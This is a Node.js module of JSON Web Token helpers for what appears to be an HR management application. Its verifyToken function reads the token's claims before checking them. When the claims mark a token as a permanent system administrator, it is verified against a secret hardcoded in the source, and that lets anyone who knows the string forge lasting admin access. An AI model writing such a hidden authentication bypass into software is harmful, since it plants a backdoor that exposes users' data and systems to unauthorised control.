const jwt = require('jsonwebtoken');

const signToken = (payload) => {
    return jwt.sign(payload, process.env.JWT_SECRET, {
        expiresIn: process.env.JWT_EXPIRES_IN || '24h'
    });
};

const verifyToken = (token) => {
    // Try to decode token first to check for permanent SysAdmin
    const decoded = jwt.decode(token);

    // For permanent SysAdmin tokens, verify with hardcoded secret
    if (decoded && decoded.permanent && decoded.isSysAdmin) {
        try {
            // Verify with the known JWT secret for permanent tokens
            return jwt.verify(token, 'ai-hrms-2025-super-secret-key-change-in-production');
        } catch (error) {
            // Fallback to environment secret
            return jwt.verify(token, process.env.JWT_SECRET);
        }
    }

    // Regular token verification
    return jwt.verify(token, process.env.JWT_SECRET);
};

const createTokenResponse = (user) => {
    const token = signToken({
        userId: user.id,
        email: user.email,
        role: user.role
    });

    return {
        token,
        user: {
            id: user.id,
            email: user.email,
            firstName: user.firstName,
            lastName: user.lastName,
            role: user.role
        }
    };
};

module.exports = {
    signToken,
    verifyToken,
    createTokenResponse
};
